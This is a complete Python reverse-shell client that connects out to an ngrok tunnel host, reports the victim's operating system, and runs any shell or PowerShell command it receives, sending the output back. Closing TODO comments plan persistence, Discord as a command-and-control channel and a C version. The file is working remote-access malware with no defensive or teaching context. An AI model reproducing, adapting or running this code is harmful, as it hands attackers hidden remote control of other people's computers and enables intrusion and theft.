import os
import platform
import subprocess
import socket
import struct

HEADER = 8  # 8 bytes for the header (64-bit unsigned int)
NO_OUTPUT_COMMANDS = ['cd']

def send(s, msg):
    msg_length = len(msg)
    msg = msg.encode()
    header = struct.pack("Q", msg_length)
    s.send(header + msg)

def recv(s):
    header = s.recv(HEADER)
    if not header:
        return
    msg_length = struct.unpack("Q", header)[0]
    msg = s.recv(msg_length)
    return msg.decode()
    
def get_os():
    return platform.system()

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    send(s,get_os())

    while True:
        cmd = recv(s)
        if cmd == "exit":
            s.close()
            break
        elif cmd.split(" ")[0] == "cd":
            try:
                # check existence 
                if os.path.exists(cmd.split(" ")[1]):
                    os.chdir(os.path.expanduser(cmd.split(" ")[1]))
                    send(s, "Directory changed successfully")
                else:
                    send(s, "Directory not found")
            except FileNotFoundError as e:
                send(s, str(e))
        else :
            if get_os() == "Windows":
                cmd = "powershell.exe " + cmd
            result = subprocess.run(cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                if not result.stdout and not result.stderr:
                    send(s, "Command executed successfully and no output")
                else:
                    send(s,result.stdout.decode(errors="ignore"))
            else:
                send(s,result.stderr.decode(errors="ignore"))

if __name__ == "__main__":
    ip = socket.getaddrinfo("0.tcp.eu.ngrok.io",10748)[0][4][0] # IP of the server
    port = 10748
    reverse_shell(ip, port)

# TODO : Multithreading
# TODO : Persistance
# TODO : use discord as C2
# TODO : same thing in C
